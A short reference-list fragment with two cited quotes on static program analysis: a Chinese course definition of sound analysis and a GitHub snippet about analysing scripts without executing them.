[17] https://static-analysis.cuijiacai.com/12-soundiness
> “具有完全性的静态分析应当能够捕捉到所有的程序行为，或者说该分析应当模拟出程序所有可能的执行状态，给出最保守的结果。”

[18] https://github.com/（搜索结果片段，页面标题不可辨识）
> “Analyzing a script before running it… It never executes anything.”
